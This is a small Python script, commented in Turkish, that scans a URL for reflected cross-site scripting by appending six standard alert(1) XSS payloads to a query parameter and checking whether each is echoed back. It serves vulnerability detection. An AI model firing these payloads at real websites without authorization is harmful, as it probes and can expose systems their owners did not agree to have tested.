
import requests

# Basit XSS payload listesi (Reflected XSS tespiti için)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "';alert(1);//",
    "<body onload=alert(1)>"
]

def scan_xss(url):
    results = {
        "status": "safe",
        "explanation": "XSS açığı tespit edilmedi. Sayfa gelen veriyi düzgün şekilde filtreliyor.",
        "payload": None
    }

    for payload in XSS_PAYLOADS:
        try:
            # URL parametresi olarak "test" parametresine XSS payload ekleniyor
            test_url = f"{url}?test={payload}"
            response = requests.get(test_url, timeout=5)

            # Yanıtta payload'ın yansıması varsa, açık olabilir
            if payload in response.text:
                results["status"] = "vulnerable"
                results["explanation"] = "XSS açığı tespit edildi! Sayfa gönderilen script'i filtrelemiyor."
                results["payload"] = payload
                break

        except requests.RequestException:
            continue

    return results
